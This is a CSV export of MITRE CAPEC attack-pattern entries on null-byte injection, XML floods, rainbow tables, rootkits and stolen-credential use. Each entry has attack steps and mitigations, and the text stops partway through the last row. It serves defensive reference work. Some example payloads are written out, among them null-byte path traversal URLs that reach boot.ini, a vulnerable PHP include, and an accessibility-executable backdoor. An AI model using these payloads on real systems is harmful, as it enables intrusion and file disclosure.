CAPEC-52,Embedding NULL Bytes,Detailed,Draft,An adversary embeds one or more null bytes in input to the target software. This attack relies on the usage of a null-valued byte as a string terminator in many environments. The goal is for certain components of the target software to stop processing the input when it encounters the null byte(s).,N/A,High,High,::NATURE:ChildOf:CAPEC ID:267::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for user-controllable inputs] Using a browser, an automated tool or by inspecting the application, an adversary records all entry points to the application.TECHNIQUE:Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.:TECHNIQUE:Manually inspect the application to find entry points.::STEP:2:PHASE:Experiment:DESCRIPTION:[Probe entry points to locate vulnerabilities] The adversary uses the entry points gathered in the Explore phase as a target list and injects postfix null byte(s) to observe how the application handles them as input. The adversary is looking for areas where user input is placed in the middle of a string, and the null byte causes the application to stop processing the string at the end of the user input.TECHNIQUE:Try different encodings for null such as 0 or %00::STEP:3:PHASE:Exploit:DESCRIPTION:[Remove data after null byte(s)] After determined entry points that are vulnerable, the adversary places a null byte(s) such that they remove data after the null byte(s) in a way that is beneficial to them.TECHNIQUE:If the input is a directory as part of a longer file path, add a null byte(s) at the end of the input to try to traverse to the given directory.::",::The program does not properly handle postfix NULL terminators::,::SKILL:Directory traversal:LEVEL:Medium::SKILL:Execution of arbitrary code:LEVEL:High::,N/A,N/A,::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::,::Properly handle the NULL characters supplied as part of user input prior to doing anything with the data.::,"::Directory Browsing Assume a Web application allows a user to access a set of reports. The path to the reports directory may be something like web/username/reports. If the username is supplied via a hidden field, an adversary could insert a bogus username such as ../../../../../WINDOWS. If the adversary needs to remove the trailing string /reports, then they can simply insert enough characters so the string is truncated. Alternatively the adversary might apply the postfix NULL character (%00) to determine whether this terminates the string. Different forms of NULL to think about include PATH%00PATH[0x00]PATH[alternate representation of NULL character]<script></script>%00::Exploitation of a buffer overflow vulnerability in the ActiveX component packaged with Adobe Systems Inc.'s Acrobat/Acrobat Reader allows remote adversaries to execute arbitrary code. The problem specifically exists upon retrieving a link of the following form: GET /any_existing_dir/any_existing_pdf.pdf%00[long string] HTTP/1.1 Where [long string] is a malicious crafted long string containing acceptable URI characters. The request must be made to a web server that truncates the request at the null byte (%00), otherwise an invalid file name is specified and a file not found page will be returned. Example web servers that truncate the requested URI include Microsoft IIS and Netscape Enterprise. Though the requested URI is truncated for the purposes of locating the file the long string is still passed to the Adobe ActiveX component responsible for rendering the page. This in turn triggers a buffer overflow within RTLHeapFree() allowing for an adversary to overwrite an arbitrary word in memory. The responsible instructions from RTLHeapFree() are shown here: 0x77F83AE5 MOV EAX,[EDI+8]0x77F83AE8 MOV ECX,[EDI+C]...0x77F83AED MOV [ECX],EAX The register EDI contains a pointer to a user-supplied string. The adversary therefore has control over both the ECX and EAX registers used in the shown MOV instruction. Successful exploitation allows remote adversaries to utilize the arbitrary word overwrite to redirect the flow of control and eventually take control of the affected system. Code execution will occur under the context of the user that instantiated the vulnerable version of Adobe Acrobat. An adversary does not need to establish a malicious web site as exploitation can occur by adding malicious content to the end of any embedded link and referencing any Microsoft IIS or Netscape Enterprise web server. Clicking on a direct malicious link is also not required as it may be embedded within an IMAGE tag, an IFRAME or an auto-loading script. Successful exploitation requires that a payload be written such that certain areas of the input are URI acceptable. This includes initial injected instructions as well as certain overwritten addresses. This increases the complexity of successful exploitation. While not trivial, exploitation is definitely plausible [REF-445].See also: CVE-2004-0629::Consider the following PHP script: $whatever = addslashes($_REQUEST['whatever']);include(/path/to/program/ . $whatever . /header.htm); A malicious adversary might open the following URL, disclosing the boot.ini file: http://localhost/phpscript.php?whatever=../../../../boot.ini%00::",::158::172::173::74::20::697::707::,TAXONOMY NAME:WASC:ENTRY ID:28:ENTRY NAME:Null Byte Injection::::TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Embedding Null Code::,N/A,https://capec.mitre.org/data/definitions/52.html
CAPEC-528,XML Flood,Standard,Draft,"An adversary may execute a flooding attack using XML messages with the intent to deny legitimate users access to a web service. These attacks are accomplished by sending a large number of XML based requests and letting the service attempt to parse each one. In many cases this type of an attack will result in a XML Denial of Service (XDoS) due to an application becoming unstable, freezing, or crashing.",::TERM:XML Denial of Service (XML DoS):DESCRIPTION:::,Low,Medium,::NATURE:ChildOf:CAPEC ID:125::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the target] Using a browser or an automated tool, an attacker records all instance of web services to process XML requests.TECHNIQUE:Use an automated tool to record all instances of URLs to process XML requests.:TECHNIQUE:Use a browser to manually explore the website and analyze how the application processes XML requests.::STEP:2:PHASE:Experiment:DESCRIPTION:An adversary crafts input data that may have an adverse effect on the operation of the web service when the XML data sent to the service.::STEP:3:PHASE:Exploit:DESCRIPTION:[Launch a resource depletion attack] The attacker delivers a large number of XML messages to the target URLs found in the explore phase at a sufficiently rapid rate. It causes denial of service to the target application.TECHNIQUE:Send a large number of crafted XML messages to the target URL.::",::The target must receive and process XML transactions.::An adverssary must possess the ability to generate a large amount of XML based messages to send to the target service.::,::SKILL:Denial of service:LEVEL:Low::,N/A,::A large amount of data is passed to the XML parser possibly making it crash or otherwise unavailable to end users.::,::SCOPE:AvailabilityTECHNICAL IMPACT:Resource Consumption::,::Design: Build throttling mechanism into the resource allocation. Provide for a timeout mechanism for allocated resources whose transaction does not complete within a specified interval.::Implementation: Provide for network flow control and traffic shaping to control access to the resources.::,"::Consider the case of attack performed against the createCustomerBillingAccount Web Service for an online store. In this case, the createCustomerBillingAccount Web Service receives a huge number of simultaneous requests, containing nonsense billing account creation information (the small XML messages). The createCustomerBillingAccount Web Services may forward the messages to other Web Services for processing. The application suffers from a high load of requests, potentially leading to a complete loss of availability the involved Web Service.::",::770::,TAXONOMY NAME:ATTACK:ENTRY ID:1499.002:ENTRY NAME:Endpoint Denial of Service:Service Exhaustion Flood::::TAXONOMY NAME:ATTACK:ENTRY ID:1498.001:ENTRY NAME:Network Denial of Service:Direct Network Flood::,N/A,https://capec.mitre.org/data/definitions/528.html
CAPEC-53,"Postfix, Null Terminate, and Backslash",Detailed,Draft,"If a string is passed through a filter of some kind, then a terminal NULL may not be valid. Using alternate representation of NULL allows an adversary to embed the NULL mid-string while postfixing the proper data so that the filter is avoided. One example is a filter that looks for a trailing slash character. If a string insertion is possible, but the slash must exist, an alternate encoding of NULL in mid-string may be used.",N/A,High,High,::NATURE:ChildOf:CAPEC ID:267::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for user-controllable inputs] Using a browser, an automated tool or by inspecting the application, an adversary records all entry points to the application.TECHNIQUE:Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.:TECHNIQUE:Manually inspect the application to find entry points.::STEP:2:PHASE:Experiment:DESCRIPTION:[Probe entry points to locate vulnerabilities] The adversary uses the entry points gathered in the Explore phase as a target list and injects postfix null byte(s) followed by a backslash to observe how the application handles them as input. The adversary is looking for areas where user input is placed in the middle of a string, and the null byte causes the application to stop processing the string at the end of the user input.TECHNIQUE:Try different encodings for null such as 0 or %00 followed by an encoding for the backslash character.::STEP:3:PHASE:Exploit:DESCRIPTION:[Remove data after null byte(s)] After determined entry points that are vulnerable, the adversary places a null byte(s) followed by a backslash such that they bypass an input filter and remove data after the null byte(s) in a way that is beneficial to them.TECHNIQUE:If the input is a directory as part of a longer file path, add a null byte(s) followed by a backslash at the end of the input to try to traverse to the given directory.::",::Null terminators are not properly handled by the filter.::,"::SKILL:An adversary needs to understand alternate encodings, what the filter looks for and the data format acceptable to the target API:LEVEL:Medium::",N/A,"::Null characters are observed by the filter. The filter needs to be able to understand various encodings of the Null character, or only canonical data should be passed to it.::",::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::,::Properly handle Null characters. Make sure canonicalization is properly applied. Do not pass Null characters to the underlying APIs.::Assume all input is malicious. Create an allowlist that defines all valid input to the software system based on the requirements specifications. Input that does not match against the allowlist should not be permitted to enter into the system.::,::A rather simple injection is possible in a URL: http://getAccessHostname/sekbin/helpwin.gas.bat?mode=&draw=x&file=x&module=&locale=[insert relative path here][%00][%5C]&chapter= This attack has appeared with regularity in the wild. There are many variations of this kind of attack. Spending a short amount of time injecting against Web applications will usually result in a new exploit being discovered.::,::158::172::173::74::20::697::707::,N/A,N/A,https://capec.mitre.org/data/definitions/53.html
CAPEC-533,Malicious Manual Software Update,Detailed,Draft,"An attacker introduces malicious code to the victim's system by altering the payload of a software update, allowing for additional compromise or site disruption at the victim location. These manual, or user-assisted attacks, vary from requiring the user to download and run an executable, to as streamlined as tricking the user to click a URL. Attacks which aim at penetrating a specific network infrastructure often rely upon secondary attack methods to achieve the desired impact. Spamming, for example, is a common method employed as an secondary attack vector. Thus the attacker has in their arsenal a choice of initial attack vectors ranging from traditional SMTP/POP/IMAP spamming and its varieties, to web-application mechanisms which commonly implement both chat and rich HTML messaging within the user interface.",N/A,Low,High,::NATURE:ChildOf:CAPEC ID:186::,N/A,::Advanced knowledge about the download and update installation processes.::Advanced knowledge about the deployed system and its various software subcomponents and processes.::,::SKILL:Able to develop malicious code that can be used on the victim's system while maintaining normal functionality.:LEVEL:High::,N/A,N/A,N/A,::Only accept software updates from an official source.::,"::An email campaign was initiated, targetting victims of a ransomware attack. The email claimed to be a patch to address the ransomware attack, but was instead an attachment that caused the Cobalt Strike tools to be installed, which enabled further attacks.::",::494::,N/A,N/A,https://capec.mitre.org/data/definitions/533.html
CAPEC-536,Data Injected During Configuration,Standard,Stable,"An attacker with access to data files and processes on a victim's system injects malicious data into critical operational data during configuration or recalibration, causing the victim's system to perform in a suboptimal manner that benefits the adversary.",N/A,Low,High,::NATURE:ChildOf:CAPEC ID:176::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine configuration process] The adversary, through a previously compromised system, either remotely or physically, determines what the configuration process is. They look at configuration files, data files, and running processes on the system to identify areas where they could inject malicious data.::STEP:2:PHASE:Explore:DESCRIPTION:[Determine when configuration occurs] The adversary needs to then determine when configuration or recalibration of a system occurs so they know when to inject malicious data.TECHNIQUE:Look for a weekly update cycle or repeated update schedule.:TECHNIQUE:Insert a malicious process into the target system that notifies the adversary when configuration is occurring.::STEP:3:PHASE:Experiment:DESCRIPTION:[Determine malicious data to inject] By looking at the configuration process, the adversary needs to determine what malicious data they want to insert and where to insert it.TECHNIQUE:Add false log data:TECHNIQUE:Change configuration files:TECHNIQUE:Change data files::STEP:4:PHASE:Exploit:DESCRIPTION:[Inject malicious data] Right before, or during system configuration, the adversary injects the malicious data. This leads to the system behaving in a way that is beneficial to the adversary and is often followed by other attacks.::",::The attacker must have previously compromised the victim's systems or have physical access to the victim's systems.::Advanced knowledge of software and hardware capabilities of a manufacturer's product.::,::SKILL:Ability to generate and inject false data into operational data into a system with the intent of causing the victim to alter the configuration of the system.:LEVEL:High::,N/A,N/A,N/A,::Ensure that proper access control is implemented on all systems to prevent unauthorized access to system files and processes.::,"::An adversary wishes to bypass a security system to access an additional network segment where critical data is kept. The adversary knows that some configurations of the security system will allow for remote bypass under certain conditions, such as switching a specific parameter to a different value. The adversary knows the bypass will work but also will be detected within the logging data of the security system. The adversary waits until an upgrade is performed to the security system by the victim's system administrators, and the adversary has access to an external logging system. The adversary injects false log entries that cause the administrators to think there are two different error states within the security system - one involving the specific parameter and the other involving the logging entries. The specific parameter is adjusted to a different value, and the logging level is reduced to a lower level that will not cause an adversary bypass to be detected. The adversary stops injecting false log data, and the administrators of the security system believe the issues were caused by the upgrade and are now resolved. The adversary is then able to bypass the security system.::",::284::,N/A,N/A,https://capec.mitre.org/data/definitions/536.html
CAPEC-54,Query System for Information,Standard,Draft,"An adversary, aware of an application's location (and possibly authorized to use the application), probes an application's structure and evaluates its robustness by submitting requests and examining responses. Often, this is accomplished by sending variants of expected queries in the hope that these modified queries might return information beyond what the expected set of queries would provide.",N/A,High,Low,::NATURE:ChildOf:CAPEC ID:116::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine parameters] Determine all user-controllable parameters of the application either by probing or by finding documentation::STEP:2:PHASE:Experiment:DESCRIPTION:[Cause error condition] Inject each parameter with content that causes an error condition to manifest::STEP:3:PHASE:Experiment:DESCRIPTION:[Modify parameters] Modify the content of each parameter according to observed error conditions::STEP:4:PHASE:Exploit:DESCRIPTION:[Follow up attack] Once the above steps have been repeated with enough parameters, the application will be sufficiently mapped out. The adversary can then launch a desired attack (for example, Blind SQL Injection)::","::This class of attacks does not strictly require authorized access to the application. As Attackers use this attack process to classify, map, and identify vulnerable aspects of an application, it simply requires hypotheses to be verified, interaction with the application, and time to conduct trial-and-error activities.::","::SKILL:Although fuzzing parameters is not difficult, and often possible with automated fuzzers, interpreting the error conditions and modifying the parameters so as to move further in the process of mapping the application requires detailed knowledge of target platform, the languages and packages used as well as software design.:LEVEL:Medium::","::The Attacker needs the ability to probe application functionality and provide it erroneous directives or data without triggering intrusion detection schemes or making enough of an impact on application logging that steps are taken against the adversary. The Attack does not need special hardware, software, skills, or access.::","::Repeated errors generated by the same piece of code are an indication, although it requires careful monitoring of the application and its associated error logs, if any.::",::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::,"::Application designers can construct a 'code book' for error messages. When using a code book, application error messages aren't generated in string or stack trace form, but are cataloged and replaced with a unique (often integer-based) value 'coding' for the error. Such a technique will require helpdesk and hosting personnel to use a 'code book' or similar mapping to decode application errors/logs in order to respond to them normally.::Application designers can wrap application functionality (preferably through the underlying framework) in an output encoding scheme that obscures or cleanses error messages to prevent such attacks. Such a technique is often used in conjunction with the above 'code book' suggestion.::","::Blind SQL injection is an example of this technique, applied to successful exploit. See also: CVE-2006-4705::Attacker sends bad data at various servlets in a J2EE system, records returned exception stack traces, and maps application functionality. In addition, this technique allows attackers to correlate those servlets used with the underlying open source packages (and potentially version numbers) that provide them.::",::209::,N/A,N/A,https://capec.mitre.org/data/definitions/54.html
CAPEC-540,Overread Buffers,Standard,Draft,"An adversary attacks a target by providing input that causes an application to read beyond the boundary of a defined buffer. This typically occurs when a value influencing where to start or stop reading is set to reflect positions outside of the valid memory location of the buffer. This type of attack may result in exposure of sensitive information, a system crash, or arbitrary code execution.",N/A,Low,High,::NATURE:ChildOf:CAPEC ID:123::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify target application] The adversary identifies a target application or program to perform the buffer overread on. Adversaries often look for applications that accept user input and that perform manual memory management.::STEP:2:PHASE:Experiment:DESCRIPTION:[Find attack vector] The adversary identifies an attack vector by looking for areas in the application where they can specify to read more data than is required.::STEP:3:PHASE:Exploit:DESCRIPTION:[Overread the buffer] The adversary provides input to the application that gets it to read past the bounds of a buffer, possibly revealing sensitive information that was not intended to be given to the adversary.::","::For this type of attack to be successful, a few prerequisites must be met. First, the targeted software must be written in a language that enables fine grained buffer control. (e.g., c, c++) Second, the targeted software must actually perform buffer operations and inadequately perform bounds-checking on those buffer operations. Finally, the adversary must have the capability to influence the input that guides these buffer operations.::",N/A,N/A,N/A,"::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data:NOTE:Confidentiality Read Data By reading outside the boundary of the intended buffer, the adversary is potentially able to see any data that is stored on the disk. This could include secret keys, personal information, and sensitive files.::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution:NOTE:Availability Unreliable Execution Depending on the use of the target buffer, an application or system crash can be achieved.::",N/A,N/A,::125::,N/A,N/A,https://capec.mitre.org/data/definitions/540.html
CAPEC-546,Incomplete Data Deletion in a Multi-Tenant Environment,Detailed,Draft,"An adversary obtains unauthorized information due to insecure or incomplete data deletion in a multi-tenant environment. If a cloud provider fails to completely delete storage and data from former cloud tenants' systems/resources, once these resources are allocated to new, potentially malicious tenants, the latter can probe the provided resources for sensitive information still there.",N/A,Low,Medium,::NATURE:ChildOf:CAPEC ID:545::,N/A,::The cloud provider must not assuredly delete part or all of the sensitive data for which they are responsible.The adversary must have the ability to interact with the system.::,::SKILL:The adversary requires the ability to traverse directory structure.:LEVEL:Low::,N/A,N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data:NOTE:Confidentiality Read Data A successful attack that probes application memory will compromise the confidentiality of that data.::,::Cloud providers should completely delete data to render it irrecoverable and inaccessible from any layer and component of infrastructure resources.::Deletion of data should be completed promptly when requested.::,N/A,::284::1266::1272::,N/A,N/A,https://capec.mitre.org/data/definitions/546.html
CAPEC-549,Local Execution of Code,Meta,Stable,"An adversary installs and executes malicious code on the target system in an effort to achieve a negative technical impact. Examples include rootkits, ransomware, spyware, adware, and others.",N/A,Medium,High,N/A,N/A,::Knowledge of the target system's vulnerabilities that can be capitalized on with malicious code.The adversary must be able to place the malicious code on the target system.::,N/A,"::The means by which the adversary intends to place the malicious code on the system dictates the tools required. For example, suppose the adversary wishes to leverage social engineering and convince a legitimate user to open a malicious file attached to a seemingly legitimate email. In this case, the adversary might require a tool capable of wrapping malicious code into an innocuous filetype (e.g., PDF, .doc, etc.)::",N/A,"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Other:NOTE:Confidentiality Integrity Availability Other Depending on the type of code executed by the adversary, the consequences of this attack pattern can vary widely.::",::Employ robust cybersecurity training for all employees.::Implement system antivirus software that scans all attachments before opening them.::Regularly patch all software.::Execute all suspicious files in a sandbox environment.::,"::BlueBorne refers to a set of nine vulnerabilities on different platforms (Linux, Windows, Android, iOS) that offer an adversary the ability to install and execute malicious code on a system if they were close in proximity to a Bluetooth enabled device. One vulnerability affecting iOS versions 7 through 9 allowed an attacker to overflow the Low Energy Audio Protocol since commands sent over this protocol are improperly validated and gain the elevated permissions of the Bluetooth stack. These vulnerabilities were a result of poor validation and were patched shortly after their exposure in 2017, but many non-updated devices remain vulnerable.::",::829::,N/A,N/A,https://capec.mitre.org/data/definitions/549.html
CAPEC-55,Rainbow Table Password Cracking,Detailed,Draft,"An attacker gets access to the database table where hashes of passwords are stored. They then use a rainbow table of pre-computed hash chains to attempt to look up the original password. Once the original password corresponding to the hash is obtained, the attacker uses the original password to gain access to the system.",N/A,Medium,Medium,::NATURE:ChildOf:CAPEC ID:49::NATURE:CanPrecede:CAPEC ID:600::NATURE:CanPrecede:CAPEC ID:151::NATURE:CanPrecede:CAPEC ID:560::NATURE:CanPrecede:CAPEC ID:561::NATURE:CanPrecede:CAPEC ID:653::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine application's/system's password policy] Determine the password policies of the target application/system.TECHNIQUE:Determine minimum and maximum allowed password lengths.:TECHNIQUE:Determine format of allowed passwords (whether they are required or allowed to contain numbers, special characters, etc.).:TECHNIQUE:Determine account lockout policy (a strict account lockout policy will prevent brute force attacks).::STEP:2:PHASE:Explore:DESCRIPTION:[Obtain password hashes] An attacker gets access to the database table storing hashes of passwords or potentially just discovers a hash of an individual password.TECHNIQUE:Obtain copy of database table or flat file containing password hashes (by breaking access controls, using SQL Injection, etc.):TECHNIQUE:Obtain password hashes from platform-specific storage locations (e.g. Windows registry):TECHNIQUE:Sniff network packets containing password hashes.::STEP:3:PHASE:Exploit:DESCRIPTION:[Run rainbow table-based password cracking tool] An attacker finds or writes a password cracking tool that uses a previously computed rainbow table for the right hashing algorithm. It helps if the attacker knows what hashing algorithm was used by the password system.TECHNIQUE:Run rainbow table-based password cracking tool such as Ophcrack or RainbowCrack. Reduction function must depend on application's/system's password policy.::","::Hash of the original password is available to the attacker. For a better chance of success, an attacker should have more than one hash of the original password, and ideally the whole table.::Salt was not used to create the hash of the original password. Otherwise the rainbow tables have to be re-computed, which is very expensive and will make the attack effectively infeasible (especially if salt was added in iterations).::The system uses one factor password based authentication.::",::SKILL:A variety of password cracking tools are available that can leverage a rainbow table. The more difficult part is to obtain the password hash(es) in the first place.:LEVEL:Low::,::Rainbow table of password hash chains with the right algorithm used. A password cracking tool that leverages this rainbow table will also be required. Hash(es) of the password is required.::,::This is a completely offline attack that an attacker can perform at their leisure after the password hashes are obtained.::,::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::,"::Use salt when computing password hashes. That is, concatenate the salt (random bits) with the original password prior to hashing it.::","::BusyBox 1.1.1 does not use a salt when generating passwords, which makes it easier for local users to guess passwords from a stolen password file using techniques such as rainbow tables. See also: CVE-2006-1058::",::261::521::262::263::654::916::308::309::,TAXONOMY NAME:ATTACK:ENTRY ID:1110.002:ENTRY NAME:Brute Force:Password Cracking::,N/A,https://capec.mitre.org/data/definitions/55.html
CAPEC-550,Install New Service,Detailed,Draft,"When an operating system starts, it also starts programs called services or daemons. Adversaries may install a new service which will be executed at startup (on a Windows system, by modifying the registry). The service name may be disguised by using a name from a related operating system or benign software. Services are usually run with elevated privileges.",N/A,N/A,N/A,::NATURE:ChildOf:CAPEC ID:542::,N/A,N/A,N/A,N/A,N/A,N/A,::Limit privileges of user accounts so new service creation can only be performed by authorized administrators.::,N/A,::284::,TAXONOMY NAME:ATTACK:ENTRY ID:1543.002:ENTRY NAME:Create or Modify System Process:Systemd Service::::TAXONOMY NAME:ATTACK:ENTRY ID:1543.003:ENTRY NAME:Create or Modify System Process:Windows Service::::TAXONOMY NAME:ATTACK:ENTRY ID:1543.004:ENTRY NAME:Create or Modify System Process:Launch Daemon::,N/A,https://capec.mitre.org/data/definitions/550.html
CAPEC-551,Modify Existing Service,Detailed,Draft,"When an operating system starts, it also starts programs called services or daemons. Modifying existing services may break existing services or may enable services that are disabled/not commonly used.",N/A,N/A,N/A,::NATURE:ChildOf:CAPEC ID:542::,N/A,N/A,N/A,N/A,N/A,N/A,::Limit privileges of user accounts so service changes can only be performed by authorized administrators. Also monitor any service changes that may occur inadvertently.::,N/A,::284::522::,TAXONOMY NAME:ATTACK:ENTRY ID:1543.002:ENTRY NAME:Create or Modify System Process:Systemd Service::::TAXONOMY NAME:ATTACK:ENTRY ID:1543.003:ENTRY NAME:Create or Modify System Process:Windows Service::::TAXONOMY NAME:ATTACK:ENTRY ID:1543.004:ENTRY NAME:Create or Modify System Process:Launch Daemon::,N/A,https://capec.mitre.org/data/definitions/551.html
CAPEC-552,Install Rootkit ,Detailed,Draft,"An adversary exploits a weakness in authentication to install malware that alters the functionality and information provide by targeted operating system API calls. Often referred to as rootkits, it is often used to hide the presence of programs, files, network connections, services, drivers, and other system components.",N/A,Medium,High,::NATURE:ChildOf:CAPEC ID:542::,N/A,N/A,N/A,N/A,N/A,N/A,::Prevent adversary access to privileged accounts necessary to install rootkits.::,"::A rootkit may take the form of a hypervisor. A hypervisor is a software layer that sits between the operating system and the processor. It presents a virtual running environment to the operating system. An example of a common hypervisor is Xen. Because a hypervisor operates at a level below the operating system it can hide its existence from the operating system.::Similar to a rootkit, a bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR). Adversaries may use bootkits to persist on systems at a layer below the operating system, which may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.::",::284::,TAXONOMY NAME:ATTACK:ENTRY ID:1014:ENTRY NAME:Rootkit::::TAXONOMY NAME:ATTACK:ENTRY ID:1542.003:ENTRY NAME:Pre-OS Boot:Bootkit::::TAXONOMY NAME:ATTACK:ENTRY ID:1547.006:ENTRY NAME:Boot or Logon Autostart Execution:Kernel Modules and Extensions::,N/A,https://capec.mitre.org/data/definitions/552.html
CAPEC-555,Remote Services with Stolen Credentials,Standard,Stable,"This pattern of attack involves an adversary that uses stolen credentials to leverage remote services such as RDP, telnet, SSH, and VNC to log into a system. Once access is gained, any number of malicious activities could be performed.",N/A,N/A,Very High,::NATURE:ChildOf:CAPEC ID:560::NATURE:CanPrecede:CAPEC ID:151::,N/A,N/A,N/A,N/A,N/A,N/A,"::Disable RDP, telnet, SSH and enable firewall rules to block such traffic. Limit users and accounts that have remote interactive login access. Remove the Local Administrators group from the list of groups allowed to login through RDP. Limit remote user permissions. Use remote desktop gateways and multifactor authentication for remote logins.::","::Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). There are other implementations and third-party tools that provide graphical access Remote Services similar to RDS. Adversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials.::Windows Remote Management (WinRM) is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services). It may be called with the winrm command or by any number of programs such as PowerShell.::",::522::308::309::294::263::262::521::,TAXONOMY NAME:ATTACK:ENTRY ID:1114.002:ENTRY NAME:Email Collection:Remote Email Collection::::TAXONOMY NAME:ATTACK:ENTRY ID:1021:ENTRY NAME:Remote Services::::TAXONOMY NAME:ATTACK:ENTRY ID:1133:ENTRY NAME:External Remote Services::,N/A,https://capec.mitre.org/data/definitions/555.html
CAPEC-556,Replace File Extension Handlers,Detailed,Draft,"When a file is opened, its file handler is checked to determine which program opens the file. File handlers are configuration properties of many operating systems. Applications can modify the file handler for a given file extension to call an arbitrary program when a file with the given extension is opened.",N/A,N/A,N/A,::NATURE:ChildOf:CAPEC ID:542::,N/A,N/A,N/A,N/A,N/A,N/A,::Inspect registry for changes. Limit privileges of user accounts so changes to default file handlers can only be performed by authorized administrators.::,N/A,::284::,TAXONOMY NAME:ATTACK:ENTRY ID:1546.001:ENTRY NAME:Event Triggered Execution:Change Default File Association::,N/A,https://capec.mitre.org/data/definitions/556.html
CAPEC-558,Replace Trusted Executable,Detailed,Stable,An adversary exploits weaknesses in privilege management or access control to replace a trusted executable with a malicious version and enable the execution of malware when that trusted executable is called.,N/A,Low,High,::NATURE:ChildOf:CAPEC ID:542::,N/A,N/A,N/A,N/A,N/A,N/A,N/A,"::Specific versions of Windows contain accessibility features that may be launched with a key combination before a user has logged in (for example when they are on the Windows Logon screen). On Windows XP and Windows Server 2003/R2, the program (e.g. C:WindowsSystem32utilman.exe) may be replaced with cmd.exe (or another program that provides backdoor access). Then pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over RDP will cause the replaced file to be executed with SYSTEM privileges.::",::284::,TAXONOMY NAME:ATTACK:ENTRY ID:1546.008:ENTRY NAME:Event Triggered Execution:Accessibility Features::,N/A,https://capec.mitre.org/data/definitions/558.html
CAPEC-560,Use of Known Domain Credentials,Meta,Stable,An adversary guesses or obtains (i.e. steals or purchases) legitimate credentials (e.g. userID/password) to achieve authentication and to perform authorized actions under the guise of an authenticated user or service.,N/A,High,High,::NATURE:CanPrecede:CAPEC ID:151::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Acquire known credentials] The adversary must obtain known credentials in order to access the target system, application, or service.TECHNIQUE:An adversary purchases breached username/password combinations or leaked hashed passwords from the dark web.:TECHNIQUE:An adversary leverages a key logger or phishing attack to steal user credentials as they are provided.:TECHNIQUE:An adversary conducts a sniffing attack to steal credentials as they are transmitted.:TECHNIQUE:An adversary gains access to a database and exfiltrates password hashes.:TECHNIQUE:An adversary examines outward-facing configuration and properties files to discover hardcoded credentials.::STEP:2:PHASE:Explore:DESCRIPTION:[Determine target's password policy] Determine the password policies of the target system/application to determine if the known credentials fit within the specified criteria.TECHNIQUE:Determine minimum and maximum allowed password lengths.:TECHNIQUE:Determine format of allowed passwords (whether they are required or allowed to contain numbers, special characters, etc., or whether they are allowed to contain words from the dictionary).:TECHNIQUE:Determine account lockout policy (a strict account lockout policy will prevent brute force attacks if multiple passwords are known for a single user account).::STEP:3:PHASE:Experiment:DESCRIPTION:[Attempt authentication] Try each credential until the target grants access.TECHNIQUE:Manually or automatically enter each credential through the target's interface.::STEP:4:PHASE:Exploit:DESCRIPTION:[Impersonate] An adversary can use successful experiments or authentications to impersonate an authorized user or system, or to laterally move within a system or application::STEP:5:PHASE:Exploit:DESCRIPTION:[Spoofing] Malicious data can be injected into the target system or into a victim user's system by an adversary. The adversary can also pose as a legitimate user to perform social engineering attacks.::STEP:6:PHASE:Exploit:DESCRIPTION:[Data Exfiltration] The adversary can obtain sensitive data contained within the system or application.::","::The system/application uses one factor password based authentication, SSO, and/or cloud-based authentication.::The system/application does not have a sound password policy that is being enforced.::The system/application does not implement an effective password throttling mechanism.::The adversary possesses a list of known user accounts and corresponding passwords that may exist on the target.::","::SKILL:Once an adversary obtains a known credential, leveraging it is trivial.:LEVEL:Low::",::A list of known credentials.::A custom script that leverages the credential list to launch an attack.::,::Authentication attempts use credentials that have been used previously by the account in question.::Authentication attempts are originating from IP addresses or locations that are inconsistent with the user's normal IP addresses or locations.::Data is being transferred and/or removed from systems/applications within the network.::Suspicious or Malicious software is downloaded/installed on systems within the domain.::Messages from a legitimate user appear to contain suspicious 